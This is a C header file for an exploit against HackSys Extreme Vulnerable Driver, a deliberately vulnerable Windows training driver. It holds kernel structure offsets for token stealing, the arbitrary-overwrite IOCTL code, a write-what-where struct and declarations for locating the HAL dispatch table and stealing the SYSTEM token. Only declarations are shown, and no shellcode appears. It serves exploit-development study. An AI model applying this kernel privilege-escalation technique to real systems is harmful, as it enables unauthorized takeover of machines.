#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define ARRAY_SIZE 1024

#define KTHREAD_OFFSET	0x124
#define EPROCESS_OFFSET 0x050
#define PID_OFFSET		0x0B4
#define FLINK_OFFSET	0x0B8
#define TOKEN_OFFSET	0x0F8
#define SYSTEM_PID		0x004

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR what;
	PULONG_PTR where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef struct DEVICE_DRIVER_INFO {
	PVOID imageBaseAddr;
	PCHAR imageName;
} DEVICE_DRIVER_INFO, *PDEVICE_DRIVER_INFO;

typedef NTSTATUS (WINAPI *NtQueryIntervalProfile_t)(
		IN ULONG ProfileSource,
		OUT PULONG Interval
	);

PDEVICE_DRIVER_INFO GetNtBaseAddr();

PVOID GetHalTableAddr(PDEVICE_DRIVER_INFO pNtoskrnlInfo);

HANDLE GetDeviceHandle(LPCSTR lpFileName);

VOID StealSystemToken();